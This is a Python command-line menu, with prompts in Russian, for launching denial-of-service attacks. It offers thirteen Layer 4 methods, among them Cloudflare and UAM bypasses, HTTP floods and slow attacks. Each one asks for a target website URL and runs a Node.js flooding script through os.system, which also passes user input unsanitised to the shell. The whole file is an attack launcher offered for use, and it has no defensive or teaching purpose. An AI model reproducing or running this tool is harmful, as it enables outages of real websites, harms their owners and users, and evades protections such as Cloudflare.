from colorama import init
from colorama import Fore, init
import os

init()

print(Fore.GREEN)

what = input( "Выберите метод\n \n1. Layer7 (В разработке...)\n2. Layer4\n \n" )

if what == "1":
	print( "В разработке..." )
if what == "2":
    ddos = input("1. CloudFlare\n2. CloudFlare Bypass\n3. Flooder\n4. HTTP-FLOOD\n5. HTTP-RAND\n6. HTTP-RAW\n7. HTTPS-FAST\n8. HTTP-SOCKETS\n9. Hyper\n10. Io-Stresser\n11. Slow\n12. Uam\n13. Uam Bypass\n \n" )

if ddos == "1":
    ddoscf = input( "Введите URL сайта: " )
    os.system(f"node cf.js {ddoscf} 30 50")
if ddos == "2":
    ddoscfbypass = input( "Введите URL сайта: " )
    os.system(f"node cfbypass.js {ddoscfbypass} 40 30")
if ddos == "3":
    ddosflooder = input( "Введите URL сайта: " )
    os.system(f"node flooder.js {ddosflooder} 30 40")
if ddos == "4":
    ddoshttpflood = input( "Введите URL сайта: " )
    os.system(f"node HTTP-FLOOD.js {ddoshttpflood} 30")
if ddos == "5":
    ddoshttprand = input( "Введите URL сайта: " )
    os.system(f"node HTTP-RAND.js {ddoshttprand} 30")
if ddos == "6":
    ddoshttpraw = input( "Введите URL сайта: " )
    os.system(f"node HTTP-RAW.js {ddoshttpraw} 30")
if ddos == "7":
    ddoshttpsfast = input( "Введите URL сайта: " )
    os.system(f"node HTTPS-FAST.js {ddoshttpsfast} 30")
if ddos == "8":
    ddoshttpsockets = input( "Введите URL сайта: " )
    os.system(f"node HTTP-SOCKETS.js {ddoshttpsockets} ip 30")
if ddos == "9":
    ddoshyper = input( "Введите URL сайта: " )
    os.system(f"node cf.js {ddoshyper} 30 1")
if ddos == "10":
    ddosiostresser = input( "Введите URL сайта: " )
    os.system(f"node io-stresser.js {ddosiostresser} 30 10 proxy")
if ddos == "11":
    ddosslow = input( "Введите URL сайта: " )
    os.system(f"node slow.js {ddosslow} 30")
if ddos == "12":
    ddosuam = input( "Введите URL сайта: " )
    os.system(f"node uam.js {ddosuam} 10 30 proxy")
if ddos == "13":
    ddosuambypass = input( "Введите URL сайта: " )
    os.system(f"node ddosuambypass.js {ddosuambypass} 10 30 request")